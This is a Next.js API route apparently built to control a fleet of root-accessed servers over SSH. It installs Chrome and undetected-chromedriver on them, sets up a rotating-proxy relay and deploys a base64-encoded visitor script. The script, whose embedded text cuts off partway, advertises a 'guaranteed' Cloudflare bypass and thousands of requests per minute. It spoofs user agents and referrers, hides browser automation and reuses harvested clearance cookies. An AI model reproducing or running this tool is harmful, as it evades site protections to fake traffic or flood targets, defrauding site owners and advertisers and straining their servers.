import { NextResponse } from 'next/server';
import { Client } from 'ssh2';


const DEFAULT_SERVERS = [
  { host: '138.68.141.40', username: 'root' },
  { host: '144.126.234.13', username: 'root' },
  { host: '46.101.52.177', username: 'root' },
  { host: '142.93.41.217', username: 'root' },
  { host: '167.99.94.250', username: 'root' },
  { host: '165.22.118.138', username: 'root' },
  { host: '167.71.135.147', username: 'root' },
  { host: '138.68.141.255', username: 'root' },
  { host: '206.189.21.125', username: 'root' }
];

const SETUP_COMMAND = 'export DEBIAN_FRONTEND=noninteractive && apt-get update -y && apt-get install -y python3 python3-pip wget gnupg2 unzip libnss3 libatk-bridge2.0-0 libcups2 libdrm2 libxkbcommon0 libxcomposite1 libxdamage1 libxrandr2 libgbm1 fonts-liberation xdg-utils && (apt-get install -y libasound2 2>/dev/null || apt-get install -y libasound2t64 2>/dev/null || true) && wget -q https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb && apt-get install -y ./google-chrome-stable_current_amd64.deb 2>/dev/null; rm -f google-chrome-stable_current_amd64.deb && pip3 install undetected-chromedriver requests "selenium>=4.40" "typing_extensions>=4.12" --break-system-packages 2>/dev/null || pip3 install undetected-chromedriver requests "selenium>=4.40" "typing_extensions>=4.12" && echo SETUP_COMPLETE';

function buildRelayScript(proxyHost, proxyPort, proxyUser, proxyPass) {
  const lines = [
    '#!/usr/bin/env python3',
    'import asyncio, base64, random, string',
    'PROXY_HOST = "' + proxyHost + '"',
    'PROXY_PORT = ' + proxyPort,
    'PROXY_USER = "' + proxyUser + '"',
    'PROXY_PASS = "' + proxyPass + '"',
    'LISTEN_PORT = 18080',
    'LISTEN_HOST = "0.0.0.0"',
    'BUFFER_SIZE = 65536',
    'def get_session_auth():',
    '    sid = "".join(random.choices(string.ascii_lowercase + string.digits, k=8))',
    '    pw = f"{PROXY_PASS}_session-{sid}"',
    '    return base64.b64encode(f"{PROXY_USER}:{pw}".encode()).decode()',
    'async def pipe(r, w):',
    '    try:',
    '        while True:',
    '            data = await asyncio.wait_for(r.read(BUFFER_SIZE), timeout=60)',
    '            if not data: break',
    '            w.write(data)',
    '            await w.drain()',
    '    except: pass',
    'async def handle_client(cr, cw):',
    '    pw = None',
    '    try:',
    '        req = b""',
    '        while b"\\r\\n\\r\\n" not in req:',
    '            chunk = await asyncio.wait_for(cr.read(BUFFER_SIZE), timeout=15)',
    '            if not chunk: cw.close(); return',
    '            req += chunk',
    '        first = req.split(b"\\r\\n")[0].decode()',
    '        method = first.split()[0]',
    '        auth = get_session_auth()',
    '        pr, pw = await asyncio.wait_for(asyncio.open_connection(PROXY_HOST, PROXY_PORT), timeout=10)',
    '        if method == "CONNECT":',
    '            target = first.split()[1]',
    '            pw.write(f"CONNECT {target} HTTP/1.1\\r\\nHost: {target}\\r\\nProxy-Authorization: Basic {auth}\\r\\nProxy-Connection: keep-alive\\r\\n\\r\\n".encode())',
    '            await pw.drain()',
    '            resp = b""',
    '            while b"\\r\\n\\r\\n" not in resp:',
    '                chunk = await asyncio.wait_for(pr.read(BUFFER_SIZE), timeout=10)',
    '                if not chunk: break',
    '                resp += chunk',
    '            if b"200" in resp.split(b"\\r\\n")[0]:',
    '                cw.write(b"HTTP/1.1 200 Connection Established\\r\\n\\r\\n")',
    '                await cw.drain()',
    '                await asyncio.gather(pipe(cr, pw), pipe(pr, cw))',
    '            else:',
    '                cw.write(resp)',
    '                await cw.drain()',
    '        else:',
    '            lines2 = req.split(b"\\r\\n")',
    '            new_lines = [lines2[0]]',
    '            for line in lines2[1:]:',
    '                if line.lower().startswith(b"proxy-authorization"): continue',
    '                new_lines.append(line)',
    '            new_lines.insert(1, f"Proxy-Authorization: Basic {auth}".encode())',
    '            pw.write(b"\\r\\n".join(new_lines))',
    '            await pw.drain()',
    '            while True:',
    '                data = await asyncio.wait_for(pr.read(BUFFER_SIZE), timeout=30)',
    '                if not data: break',
    '                cw.write(data)',
    '                await cw.drain()',
    '    except: pass',
    '    finally:',
    '        try: cw.close()',
    '        except: pass',
    '        try:',
    '            if pw: pw.close()',
    '        except: pass',
    'async def main():',
    '    server = await asyncio.start_server(handle_client, LISTEN_HOST, LISTEN_PORT, limit=BUFFER_SIZE, backlog=1024)',
    '    print(f"Relay on {LISTEN_HOST}:{LISTEN_PORT}", flush=True)',
    '    async with server: await server.serve_forever()',
    'if __name__ == "__main__": asyncio.run(main())',
  ];
  return lines.join('\n');
}

async function runSSHCommand(server, command, timeout = 8000) {
  return new Promise((resolve) => {
    const conn = new Client();
    let output = '';
    let resolved = false;

    const done = (result) => {
      if (!resolved) {
        resolved = true;
        try { conn.end(); } catch(e) {}
        resolve(result);
      }
    };

    const timer = setTimeout(() => {
      done({ status: 'success', output: output.trim() || 'Command sent (timeout)' });
    }, timeout);

    conn.on('ready', () => {
      conn.exec(command, { pty: false }, (err, stream) => {
        if (err) {
          clearTimeout(timer);
          return done({ status: 'error', error: err.message });
        }

        stream.on('data', (data) => {
          output += data.toString();
        });

        stream.stderr.on('data', (data) => {
          // ignore stderr
        });

        stream.on('close', () => {
          clearTimeout(timer);
          done({ status: 'success', output: output.trim() || 'Done' });
        });
      });
    });

    conn.on('error', (err) => {
      clearTimeout(timer);
      done({ status: 'error', error: err.message });
    });

    conn.connect({
      host: server.host,
      port: 22,
      username: server.username,
      password: process.env.VPS_PASSWORD,
      readyTimeout: 5000,
      keepaliveInterval: 3000,
    });
  });
}

export async function POST(req) {
  try {
    const { action, url, visitors, duration, servers, proxies, captchaApiKey } = await req.json();
    const serverList = (servers && servers.length > 0) ? servers : DEFAULT_SERVERS;

    if (action === 'setup') {
      const results = await Promise.all(
        serverList.map(async (server) => {
          const r = await runSSHCommand(server, `nohup bash -c '${SETUP_COMMAND}' > /root/setup.log 2>&1 & echo "Setup started"`, 8000);
          return { host: server.host, ...r };
        })
      );
      return NextResponse.json({ results });

    } else if (action === 'deploy') {
      // visit.py embedded as base64 - updated automatically
      const scriptB64 = "IyEvdXNyL2Jpbi9lbnYgcHl0aG9uMwoiIiIKSFlCUklEIFRVUkJPIFZJU0lUT1IgLSBHdWFyYW50ZWVkIENGIGJ5cGFzcyArIE1heGltdW0gc3BlZWQKU3RyYXRlZ3k6CjEuIE9uZSBVQyBicm93c2VyIGdldHMgQ0YgY2xlYXJhbmNlIGNvb2tpZXMgKGJ5cGFzc2VzIGFsbCBwcm90ZWN0aW9ucykKMi4gVXNlcyB0aG9zZSBjb29raWVzIHdpdGggZmFzdCBIVFRQIHJlcXVlc3RzIHRocm91Z2ggU2F1ZGkgcHJveHkgKDEwMDBzL21pbikKMy4gQXV0by1yZWZyZXNoZXMgY29va2llcyBiZWZvcmUgdGhleSBleHBpcmUKNC4gRmFsbHMgYmFjayB0byBtdWx0aS1icm93c2VyIGlmIEhUVFAgZG9lc24ndCB3b3JrCiIiIgppbXBvcnQgc3lzLCB0aW1lLCByYW5kb20sIHRocmVhZGluZywganNvbiwgb3MsIHJlLCB1cmxsaWIucmVxdWVzdCwgdXJsbGliLnBhcnNlLCBzb2NrZXQsIHN1YnByb2Nlc3MKCnRyeToKICAgIGltcG9ydCB1bmRldGVjdGVkX2Nocm9tZWRyaXZlciBhcyB1YwogICAgSEFTX1VDID0gVHJ1ZQpleGNlcHQgSW1wb3J0RXJyb3I6CiAgICBIQVNfVUMgPSBGYWxzZQoKdHJ5OgogICAgZnJvbSBzZWxlbml1bSBpbXBvcnQgd2ViZHJpdmVyCiAgICBmcm9tIHNlbGVuaXVtLndlYmRyaXZlci5jaHJvbWUub3B0aW9ucyBpbXBvcnQgT3B0aW9ucwogICAgSEFTX1NFTEVOSVVNID0gVHJ1ZQpleGNlcHQgSW1wb3J0RXJyb3I6CiAgICBIQVNfU0VMRU5JVU0gPSBGYWxzZQoKdmlzaXRfY291bnQgPSAwCmVycm9yX2NvdW50ID0gMApsb2NrID0gdGhyZWFkaW5nLkxvY2soKQpTVEFUVVNfRklMRSA9ICIvcm9vdC92aXNpdF9zdGF0dXMuanNvbiIKREVURUNURURfTU9ERSA9ICdoeWJyaWQnCgojID09PSBQUk9YWSBDT05GSUcgPT09ClBST1hZX1JFTEFZX0hPU1QgPSAnMTI3LjAuMC4xJwpQUk9YWV9SRUxBWV9QT1JUID0gJzE4MDgwJwpVU0VfUFJPWElFUyA9IFRydWUKCiMgU2hhcmVkIENGIGNvb2tpZXMKY2ZfY29va2llcyA9IHt9CmNmX2Nvb2tpZXNfbG9jayA9IHRocmVhZGluZy5Mb2NrKCkKY2ZfdWEgPSAnJwoKIyA9PT0gRklOR0VSUFJJTlQgREFUQSA9PT0KVVNFUl9BR0VOVFMgPSBbCiAgICAnTW96aWxsYS81LjAgKGlQaG9uZTsgQ1BVIGlQaG9uZSBPUyAxN18zIGxpa2UgTWFjIE9TIFgpIEFwcGxlV2ViS2l0LzYwNS4xLjE1IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi8xNy4yIE1vYmlsZS8xNUUxNDggU2FmYXJpLzYwNC4xJywKICAgICdNb3ppbGxhLzUuMCAoaVBob25lOyBDUFUgaVBob25lIE9TIDE3XzIgbGlrZSBNYWMgT1MgWCkgQXBwbGVXZWJLaXQvNjA1LjEuMTUgKEtIVE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzE3LjEgTW9iaWxlLzE1RTE0OCBTYWZhcmkvNjA0LjEnLAogICAgJ01vemlsbGEvNS4wIChpUGhvbmU7IENQVSBpUGhvbmUgT1MgMTZfNiBsaWtlIE1hYyBPUyBYKSBBcHBsZVdlYktpdC82MDUuMS4xNSAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vMTYuNiBNb2JpbGUvMTVFMTQ4IFNhZmFyaS82MDQuMScsCiAgICAnTW96aWxsYS81LjAgKGlQaG9uZTsgQ1BVIGlQaG9uZSBPUyAxN180IGxpa2UgTWFjIE9TIFgpIEFwcGxlV2ViS2l0LzYwNS4xLjE1IChLSFRNTCwgbGlrZSBHZWNrbykgQ3JpT1MvMTIyLjAuNjI2MS44OSBNb2JpbGUvMTVFMTQ4IFNhZmFyaS82MDQuMScsCiAgICAnTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDE0OyBTTS1TOTE4QikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEyMi4wLjAuMCBNb2JpbGUgU2FmYXJpLzUzNy4zNicsCiAgICAnTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDE0OyBTTS1TOTExQikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEyMS4wLjAuMCBNb2JpbGUgU2FmYXJpLzUzNy4zNicsCiAgICAnTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDE0OyBQaXhlbCA4IFBybykgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEyMi4wLjAuMCBNb2JpbGUgU2FmYXJpLzUzNy4zNicsCiAgICAnTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEzOyBTTS1BNTQ2QikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEyMi4wLjAuMCBNb2JpbGUgU2FmYXJpLzUzNy4zNicsCiAgICAnTW96aWxsYS81LjAgKGlQaG9uZTsgQ1BVIGlQaG9uZSBPUyAxN18zXzEgbGlrZSBNYWMgT1MgWCkgQXBwbGVXZWJLaXQvNjA1LjEuMTUgKEtIVE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzE3LjIgTW9iaWxlLzE1RTE0OCBTYWZhcmkvNjA0LjEnLAogICAgJ01vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCAxNDsgU00tRzk5MUIpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMjMuMC4wLjAgTW9iaWxlIFNhZmFyaS81MzcuMzYnLApdClJFRkVSUkVSUyA9IFsKICAgICdodHRwczovL3d3dy5nb29nbGUuY29tLycsICdodHRwczovL3d3dy5nb29nbGUuY29tL3NlYXJjaD9xPXNpdGUnLAogICAgJ2h0dHBzOi8vd3d3Lmdvb2dsZS5jb20uc2EvJywgJ2h0dHBzOi8vd3d3Lmdvb2dsZS5hZS8nLAogICAgJ2h0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS8nLCAnaHR0cHM6Ly9sLmZhY2Vib29rLmNvbS8nLAogICAgJ2h0dHBzOi8vdC5jby8nLCAnaHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS8nLAogICAgJycsICcnLCAnJywKXQoKZGVmIGdldF9zdGVhbHRoX2pzKCk6CiAgICB1YSA9IHJhbmRvbS5jaG9pY2UoVVNFUl9BR0VOVFMpCiAgICBpc19tb2JpbGUgPSBUcnVlICAjIEFsd2F5cyBtb2JpbGUKICAgIHBsYXRmb3JtID0gJ2lQaG9uZScgaWYgJ2lQaG9uZScgaW4gdWEgZWxzZSAnTGludXggYXJtdjhsJwogICAgY29yZXMgPSByYW5kb20uY2hvaWNlKFsyLDRdKQogICAgbWVtb3J5ID0gcmFuZG9tLmNob2ljZShbNCw2XSkKICAgIHJlZiA9IHJhbmRvbS5jaG9pY2UoUkVGRVJSRVJTKQogICAgcmVmX2pzID0gZidPYmplY3QuZGVmaW5lUHJvcGVydHkoZG9jdW1lbnQsInJlZmVycmVyIix7e2dldDooKT0+IntyZWZ9In19KTsnIGlmIHJlZiBlbHNlICcnCiAgICByZXR1cm4gZiIiIgpPYmplY3QuZGVmaW5lUHJvcGVydHkobmF2aWdhdG9yLCd3ZWJkcml2ZXInLHt7Z2V0OigpPT51bmRlZmluZWR9fSk7CnRyeXt7ZGVsZXRlIG5hdmlnYXRvci5fX3Byb3RvX18ud2ViZHJpdmVyO319Y2F0Y2goZSl7e319CndpbmRvdy5jaHJvbWU9e3tydW50aW1lOnt7fX0sbG9hZFRpbWVzOmZ1bmN0aW9uKCl7e3JldHVybnt7fX19fSxjc2k6ZnVuY3Rpb24oKXt7cmV0dXJue3t9fX19fX07Ck9iamVjdC5kZWZpbmVQcm9wZXJ0eShuYXZpZ2F0b3IsJ3BsYXRmb3JtJyx7e2dldDooKT0+J3twbGF0Zm9ybX0nfX0pOwpPYmplY3QuZGVmaW5lUHJvcGVydHkobmF2aWdhdG9yLCdoYXJkd2FyZUNvbmN1cnJlbmN5Jyx7e2dldDooKT0+e2NvcmVzfX19KTsKT2JqZWN0LmRlZmluZVByb3BlcnR5KG5hdmlnYXRvciwnZGV2aWNlTWVtb3J5Jyx7e2dldDooKT0+e21lbW9yeX19fSk7CntyZWZfanN9CiIiIgoKZGVmIGdldF9odW1hbl9pbnRlcmFjdGlvbl9qcygpOgogICAgc2Nyb2xsX3kgPSByYW5kb20ucmFuZGludCgxMDAsIDYwMCkKICAgIHJldHVybiBmIiIiCihmdW5jdGlvbigpe3sKICAgIGZvcih2YXIgaT0wO2k8NTtpKyspe3sKICAgICAgICB2YXIgZXY9bmV3IE1vdXNlRXZlbnQoJ21vdXNlbW92ZScse3tjbGllbnRYOk1hdGgucmFuZG9tKCkqMTIwMCxjbGllbnRZOk1hdGgucmFuZG9tKCkqODAwLGJ1YmJsZXM6dHJ1ZX19KTsKICAgICAgICBkb2N1bWVudC5kaXNwYXRjaEV2ZW50KGV2KTsKICAgIH19CiAgICB3aW5kb3cuc2Nyb2xsQnkoMCx7c2Nyb2xsX3l9KTsKICAgIGRvY3VtZW50LmRpc3BhdGNoRXZlbnQobmV3IEV2ZW50KCdmb2N1cycpKTsKfX0pKCk7CiIiIgoKZGVmIHdyaXRlX3N0YXR1cyhtYXhfdmlzaXRvcnMsIHN0YXJ0X3RpbWUsIHN0YXR1cz0icnVubmluZyIpOgogICAgZ2xvYmFsIHZpc2l0X2NvdW50LCBlcnJvcl9jb3VudAogICAgZWxhcHNlZCA9IGludCh0aW1lLnRpbWUoKSAtIHN0YXJ0X3RpbWUpCiAgICBwcm9ncmVzcyA9IG1pbigxMDAsIHJvdW5kKCh2aXNpdF9jb3VudCAvIG1heF92aXNpdG9ycykgKiAxMDAsIDEpKSBpZiBtYXhfdmlzaXRvcnMgPiAwIGVsc2UgMAogICAgcmF0ZSA9IHJvdW5kKHZpc2l0X2NvdW50IC8gbWF4KGVsYXBzZWQsIDEpICogNjAsIDEpCiAgICBkYXRhID0gewogICAgICAgICJzdGF0dXMiOiBzdGF0dXMsICJ2aXNpdHMiOiB2aXNpdF9jb3VudCwgInRhcmdldCI6IG1heF92aXNpdG9ycywKICAgICAgICAicHJvZ3Jlc3MiOiBwcm9ncmVzcywgImVsYXBzZWQiOiBlbGFwc2VkLAogICAgICAgICJlcnJvcnMiOiBlcnJvcl9jb3VudCwgInRpbWVzdGFtcCI6IGludCh0aW1lLnRpbWUoKSksCiAgICAgICAgIm1vZGUiOiBERVRFQ1RFRF9NT0RFLCAicmF0ZSI6IHJhdGUKICAgIH0KICAgIHRyeToKICAgICAgICB3aXRoIG9wZW4oU1RBVFVTX0ZJTEUsICJ3IikgYXMgZjoKICAgICAgICAgICAganNvbi5kdW1wKGRhdGEsIGYpCiAgICBleGNlcHQ6IHBhc3MKCiMgPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0KIyBQSEFTRSAxOiBHZXQgQ0YgY2xlYXJhbmNlIGNvb2tpZXMgdmlhIHJlYWwgYnJvd3NlcgojID09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09CmRlZiBnZXRfY2ZfY29va2llc19icm93c2VyKHRhcmdldF91cmwpOgogICAgIiIiVXNlIHVuZGV0ZWN0ZWQtY2hyb21lZHJpdmVyIHRvIGJ5cGFzcyBDRiBhbmQgZXh0cmFjdCBjb29raWVzIiIiCiAgICBnbG9iYWwgY2ZfY29va2llcywgY2ZfdWEKICAgIAogICAgdWEgPSByYW5kb20uY2hvaWNlKFVTRVJfQUdFTlRTKQogICAgY2ZfdWEgPSB1YQogICAgCiAgICBkcml2ZXIgPSBOb25lCiAgICB0cnk6CiAgICAgICAgaWYgSEFTX1VDOgogICAgICAgICAgICBvcHRpb25zID0gdWMuQ2hyb21lT3B0aW9ucygpCiAgICAgICAgICAgIG9wdGlvbnMuYWRkX2FyZ3VtZW50KCItLWhlYWRsZXNzPW5ldyIpCiAgICAgICAgICAgIG9wdGlvbnMuYWRkX2FyZ3VtZW50KCItLW5vLXNhbmRib3giKQogICAgICAgICAgICBvcHRpb25zLmFkZF9hcmd1bWVudCgiLS1kaXNhYmxlLWRldi1zaG0tdXNhZ2UiKQogICAgICAgICAgICBvcHRpb25zLmFkZF9hcmd1bWVudCgiLS1kaXNhYmxlLWdwdSIpCiAgICAgICAgICAgIG9wdGlvbnMuYWRkX2FyZ3VtZW50KCItLXdpbmRvdy1zaXplPTQxMiw5MTUiKQogICAgICAgICAgICBvcHRpb25zLmFkZF9hcmd1bWVudChmIi0tdXNlci1hZ2VudD17dWF9IikKICAgICAgICAgICAgaWYgVVNFX1BST1hJRVM6CiAgICAgICAgICAgICAgICBvcHRpb25zLmFkZF9hcmd1bWVudChmIi0tcHJveHktc2VydmVyPWh0dHA6Ly97UFJPWFlfUkVMQVlfSE9TVH06e1BST1hZX1JFTEFZX1BPUlR9IikKICAgICAgICAgICAgZHJpdmVyID0gdWMuQ2hyb21lKG9wdGlvbnM9b3B0aW9ucywgaGVhZGxlc3M9VHJ1ZSwgZHJpdmVyX2V4ZWN1dGFibGVfcGF0aD0nL3Vzci9sb2NhbC9iaW4vY2hyb21lZHJpdmVyJykKICAgICAgICBlbGlmIEhBU19TRUxFTklVTToKICAgICAgICAgICAgb3B0cyA9IE9wdGlvbnMoKQogICAgICAgICAgICBvcHRzLmFkZF9hcmd1bWVudCgiLS1oZWFkbGVzcz1uZXciKQogICAgICAgICAgICBvcHRzLmFkZF9hcmd1bWVudCgiLS1uby1zYW5kYm94IikKICAgICAgICAgICAgb3B0cy5hZGRfYXJndW1lbnQoIi0tZGlzYWJsZS1kZXYtc2htLXVzYWdlIikKICAgICAgICAgICAgb3B0cy5hZGRfYXJndW1lbnQoIi0tZGlzYWJsZS1ncHUiKQogICAgICAgICAgICBvcHRzLmFkZF9hcmd1bWVudCgiLS1kaXNhYmxlLWJsaW5rLWZlYXR1cmVzPUF1dG9tYXRpb25Db250cm9sbGVkIikKICAgICAgICAgICAgb3B0cy5hZGRfYXJndW1lbnQoIi0td2luZG93LXNpemU9NDEyLDkxNSIpCiAgICAgICAgICAgIG9wdHMuYWRkX2FyZ3VtZW50KGYiLS11c2VyLWFnZW50PXt1YX0iKQogICAgICAgICAgICBvcHRzLmFkZF9leHBlcmltZW50YWxfb3B0aW9uKCdleGNsdWRlU3dpdGNoZXMnLCBbJ2VuYWJsZS1hdXRvbWF0aW9uJ10pCiAgICAgICAgICAgIG9wdHMuYWRkX2V4cGVyaW1lbnRhbF9vcHRpb24oJ3VzZUF1dG9tYXRpb25FeHRlbnNpb24nLCBGYWxzZSkKICAgICAgICAgICAgaWYgVVNFX1BST1hJRVM6CiAgICAgICAgICAgICAgICBvcHRzLmFkZF9hcmd1bWVudChmIi0tcHJveHktc2VydmVyPWh0dHA6Ly97UFJPWFlfUkVMQVlfSE9TVH06e1BST1hZX1JFTEFZX1BPUlR9IikKICAgICAgICAgICAgZHJpdmVyID0gd2ViZHJpdmVyLkNocm9tZShvcHRpb25zPW9wdHMpCiAgICAgICAgICAgIGRyaXZlci5leGVjdXRlX2NkcF9jbWQoJ1BhZ2UuYWRkU2NyaXB0VG9FdmFsdWF0ZU9uTmV3RG9jdW1lbnQnLCB7CiAgICAgICAgICAgICAgICAnc291cmNlJzogZ2V0X3N0ZWFsdGhfanMoKQogICAgICAgICAgICB9KQogICAgICAgIAogICAgICAgIGlmIG5vdCBkcml2ZXI6CiAgICAgICAgICAgIHByaW50KCJbQ0YtQllQQVNTXSBObyBicm93c2VyIGF2YWlsYWJsZSEiLCBmbHVzaD1UcnVlKQogICAgICAgICAgICByZXR1cm4gRmFsc2UKICAgICAgICAKICAgICAgICBwcmludChmIltDRi1CWVBBU1NdIE9wZW5pbmcge3RhcmdldF91cmx9Li4uIiwgZmx1c2g9VHJ1ZSkKICAgICAgICBkcml2ZXIuZ2V0KHRhcmdldF91cmwpCiAgICAgICAgCiAgICAgICAgIyBXYWl0IGZvciBDRiBjaGFsbGVuZ2UgdG8gcmVzb2x2ZQogICAgICAgIGZvciBpIGluIHJhbmdlKDQ1KToKICAgICAgICAgICAgdGltZS5zbGVlcCgxKQogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICBwZyA9IGRyaXZlci5wYWdlX3NvdXJjZSBvciAnJwogICAgICAgICAgICAgICAgdGl0bGUgPSBkcml2ZXIudGl0bGUgb3IgJycKICAgICAgICAgICAgICAgIGlmICdqdXN0IGEgbW9tZW50JyBub3QgaW4gcGcubG93ZXIoKSBhbmQgJ2NoZWNraW5nIHlvdXIgYnJvd3Nlcicgbm90IGluIHBnLmxvd2VyKCkgYW5kICdjaGFsbGVuZ2UtcGxhdGZvcm0nIG5vdCBpbiBwZy5sb3dlcigpOgogICAgICAgICAgICAgICAgICAgIGlmIGxlbihwZykgPiAxMDAwIGFuZCB0aXRsZSBhbmQgJ2p1c3QgYSBtb21lbnQnIG5vdCBpbiB0aXRsZS5sb3dlcigpOgogICAgICAgICAgICAgICAgICAgICAgICBwcmludChmIltDRi1CWVBBU1NdIENoYWxsZW5nZSBwYXNzZWQgYWZ0ZXIge2krMX1zISBUaXRsZToge3RpdGxlfSIsIGZsdXNoPVRydWUpCiAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgIHBhc3MKICAgICAgICAKICAgICAgICAjIEV4ZWN1dGUgaHVtYW4gaW50ZXJhY3Rpb24KICAgICAgICB0cnk6CiAgICAgICAgICAgIGRyaXZlci5leGVjdXRlX3NjcmlwdChnZXRfaHVtYW5faW50ZXJhY3Rpb25fanMoKSkKICAgICAgICAgICAgdGltZS5zbGVlcCgxKQogICAgICAgIGV4Y2VwdDogcGFzcwogICAgICAgIAogICAgICAgICMgRXh0cmFjdCBhbGwgY29va2llcwogICAgICAgIGNvb2tpZXMgPSBkcml2ZXIuZ2V0X2Nvb2tpZXMoKQogICAgICAgIGNvb2tpZV9kaWN0ID0ge30KICAgICAgICBmb3IgYyBpbiBjb29raWVzOgogICAgICAgICAgICBjb29raWVfZGljdFtjWyduYW1lJ11dID0gY1sndmFsdWUnXQogICAgICAgIAogICAgICAgIHdpdGggY2ZfY29va2llc19sb2NrOgogICAgICAgICAgICBjZl9jb29raWVzID0gY29va2llX2RpY3QKICAgICAgICAKICAgICAgICBjZl9uYW1lcyA9IFtjWyduYW1lJ10gZm9yIGMgaW4gY29va2llc10KICAgICAgICBoYXNfY2YgPSBhbnkoJ2NmX2NsZWFyYW5jZScgaW4gbiBmb3IgbiBpbiBjZl9uYW1lcykKICAgICAgICBwcmludChmIltDRi1CWVBBU1NdIEdvdCB7bGVuKGNvb2tpZXMpfSBjb29raWVzLiBDRiBjbGVhcmFuY2U6IHtoYXNfY2Z9LiBOYW1lczoge2NmX25hbWVzfSIsIGZsdXNoPVRydWUpCiAgICAgICAgCiAgICAgICAgIyBWZXJpZnkgcGFnZSBsb2FkZWQKICAgICAgICB0aXRsZSA9IGRyaXZlci50aXRsZSBvciAnJwogICAgICAgIGh0bWxfbGVuID0gbGVuKGRyaXZlci5wYWdlX3NvdXJjZSkgaWYgZHJpdmVyLnBhZ2Vfc291cmNlIGVsc2UgMAogICAgICAgIHByaW50KGYiW0NGLUJZUEFTU10gUGFnZSB0aXRsZTogJ3t0aXRsZX0nLCBIVE1MIHNpemU6IHtodG1sX2xlbn0iLCBmbHVzaD1UcnVlKQogICAgICAgIAogICAgICAgIGRyaXZlci5xdWl0KCkKICAgICAgICByZXR1cm4gbGVuKGNvb2tpZV9kaWN0KSA+IDAKICAgICAgICAKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICBwcmludChmIltDRi1CWVBBU1NdIEVycm9yOiB7ZX0iLCBmbHVzaD1UcnVlKQogICAgICAgIHRyeToKICAgICAgICAgICAgaWYgZHJpdmVyOiBkcml2ZXIucXVpdCgpCiAgICAgICAgZXhjZXB0OiBwYXNzCiAgICAgICAgcmV0dXJuIEZhbHNlCgojID09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09CiMgUEhBU0UgMjogRmFzdCBIVFRQIHZpc2l0b3IgdXNpbmcgQ0YgY29va2llcwojID09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09CmRlZiBmYXN0X2h0dHBfd29ya2VyKHdpZCwgdGFyZ2V0X3VybCwgbWF4X3Zpc2l0cywgc3RhcnRfdGltZSk6CiAgICAiIiJVbHRyYS1mYXN0IEhUVFAgdmlzaXRvciB1c2luZyBzdG9sZW4gQ0YgY29va2llcyIiIgogICAgZ2xvYmFsIHZpc2l0X2NvdW50LCBlcnJvcl9jb3VudAogICAgCiAgICBwYXJzZWQgPSB1cmxsaWIucGFyc2UudXJscGFyc2UodGFyZ2V0X3VybCkKICAgIHByb3h5X2hhbmRsZXIgPSB1cmxsaWIucmVxdWVzdC5Qcm94eUhhbmRsZXIoewogICAgICAgICdodHRwJzogZidodHRwOi8ve1BST1hZX1JFTEFZX0hPU1R9OntQUk9YWV9SRUxBWV9QT1JUfScsCiAgICAgICAgJ2h0dHBzJzogZidodHRwOi8ve1BST1hZX1JFTEFZX0hPU1R9OntQUk9YWV9SRUxBWV9QT1JUfScsCiAgICB9KSBpZiBVU0VfUFJPWElFUyBlbHNlIHVybGxpYi5yZXF1ZXN0LlByb3h5SGFuZGxlcih7fSkKICAgIAogICAgb3BlbmVyID0gdXJsbGliLnJlcXVlc3QuYnVpbGRfb3BlbmVyKHByb3h5X2hhbmRsZXIpCiAgICAKICAgIHdoaWxlIFRydWU6CiAgICAgICAgd2l0aCBsb2NrOgogICAgICAgICAgICBpZiB2aXNpdF9jb3VudCA+PSBtYXhfdmlzaXRzOgogICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAKICAgICAgICB0cnk6CiAgICAgICAgICAgIHdpdGggY2ZfY29va2llc19sb2NrOgogICAgICAgICAgICAgICAgY29va2llcyA9IGRpY3QoY2ZfY29va2llcykKICAgICAgICAgICAgCiAgICAgICAgICAgIHVhID0gcmFuZG9tLmNob2ljZShVU0VSX0FHRU5UUykKICAgICAgICAgICAgcmVmID0gcmFuZG9tLmNob2ljZShSRUZFUlJFUlMpCiAgICAgICAgICAgIGNvb2tpZV9zdHIgPSAnOyAnLmpvaW4oZid7a309e3Z9JyBmb3IgaywgdiBpbiBjb29raWVzLml0ZW1zKCkpCiAgICAgICAgICAgIAogICAgICAgICAgICBoZWFkZXJzID0gewogICAgICAgICAgICAgICAgJ1VzZXItQWdlbnQnOiB1YSwKICAgICAgICAgICAgICAgICdBY2NlcHQnOiAndGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOCcsCiAgICAgICAgICAgICAgICAnQWNjZXB0LUxhbmd1YWdlJzogJ2FyLGVuLVVTO3E9MC43LGVuO3E9MC4zJywKICAgICAgICAgICAgICAgICdBY2NlcHQtRW5jb2RpbmcnOiAnZ3ppcCwgZGVmbGF0ZSwgYnInLAogICAgICAgICAgICAgICAgJ0Nvbm5l